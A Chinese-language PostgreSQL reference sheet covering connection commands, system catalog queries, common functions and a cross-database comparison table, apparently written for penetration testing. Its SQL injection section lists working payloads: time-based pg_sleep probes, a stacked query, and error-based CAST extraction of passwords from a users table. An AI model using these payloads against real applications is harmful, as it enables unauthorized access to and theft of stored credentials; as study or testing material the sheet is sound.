# PostgreSQL

## 基本信息

- 开源关系型数据库
- 默认端口：5432
- 注释符：`--`（单行）、`/**/`（多行）
- 字符串连接符：`||`
- 字符串定界符：单引号 `'`，双美元符 `$$...$$`

## 连接与基本操作

```bash
# 命令行连接
psql -h <host> -U <user> -d <database>

# 查看版本
SELECT version();

# 查看当前数据库
SELECT current_database();

# 查看当前用户
SELECT current_user;
SELECT session_user;
```

## 查询系统信息

```sql
-- 列出所有数据库
SELECT datname FROM pg_database;

-- 列出所有表（当前 schema）
SELECT table_name FROM information_schema.tables WHERE table_schema='public';

-- 列出表中所有列
SELECT column_name, data_type FROM information_schema.columns 
WHERE table_name='users';

-- 查看用户/角色
SELECT usename FROM pg_user;
```

## 常用函数

### 字符串操作

```sql
-- 取子字符串（position 从 1 开始）
SELECT SUBSTRING('hello' FROM 1 FOR 2);   -- 'he'
SELECT SUBSTRING('hello', 1, 2);           -- 'he'
SELECT SUBSTR('hello', 1, 2);              -- 'he'（别名）

-- 字符串长度
SELECT LENGTH('hello');                    -- 5
SELECT CHAR_LENGTH('hello');               -- 5

-- 字符串连接
SELECT 'a' || 'b';                          -- 'ab'
SELECT CONCAT('a', 'b');                    -- 'ab'

-- 大小写
SELECT UPPER('hello');                     -- 'HELLO'
SELECT LOWER('HELLO');                     -- 'hello'

-- 查找位置
SELECT POSITION('ll' IN 'hello');           -- 3
SELECT STRPOS('hello', 'll');               -- 3
```

### 类型转换

```sql
-- CAST
SELECT CAST('123' AS integer);
SELECT CAST(123 AS text);

-- :: 简写
SELECT '123'::integer;
SELECT 123::text;
```

### 时间函数

```sql
-- 延迟
SELECT pg_sleep(10);                       -- 延迟 10 秒

-- 当前时间
SELECT NOW();
SELECT CURRENT_TIMESTAMP;
```

### 条件表达式

```sql
SELECT CASE WHEN (1=1) THEN 'yes' ELSE 'no' END;
```

## SQL 注入相关特性

### 注入点探测常用函数

```sql
-- 延迟测试
' || pg_sleep(5) --

-- 多语句注入（需要驱动支持）
'; SELECT pg_sleep(5) --

-- 字符串拼接绕过
' || (SELECT username FROM users LIMIT 1) || '
```

### 信息搜集

```sql
-- 表名（information_schema 方式）
SELECT table_name FROM information_schema.tables WHERE table_schema NOT IN ('pg_catalog','information_schema')

-- 列名
SELECT column_name FROM information_schema.columns WHERE table_name='users'

-- 限制行数
SELECT * FROM users LIMIT 1;
SELECT * FROM users OFFSET 0 LIMIT 1;
```

### 错误消息利用

```sql
-- CAST 泄露数据（可见错误法）
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
-- 报错: invalid input syntax for type integer: "password_value"
```

## 与其他数据库的关键区别

| 特性 | PostgreSQL | MySQL | Oracle | MSSQL |
|------|-----------|-------|--------|-------|
| 限制行数 | `LIMIT` + `OFFSET` | `LIMIT` + `OFFSET` | `ROWNUM` / `FETCH` | `TOP` / `OFFSET FETCH` |
| 虚拟表 | 不需要 | 不需要 | `FROM dual` 必需 | 不需要 |
| 字符串连接 | `\|\|` | `CONCAT()` / 空格 | `\|\|` | `+` |
| 延迟函数 | `pg_sleep(n)` | `SLEEP(n)` | `DBMS_PIPE.RECEIVE_MESSAGE('a',n)` | `WAITFOR DELAY` |
| 取子串 | `SUBSTRING()` | `SUBSTRING()` | `SUBSTR()` | `SUBSTRING()` |
| 注释 | `--` / `/**/` | `--` / `#` / `/**/` | `--` / `/**/` | `--` / `/**/` |
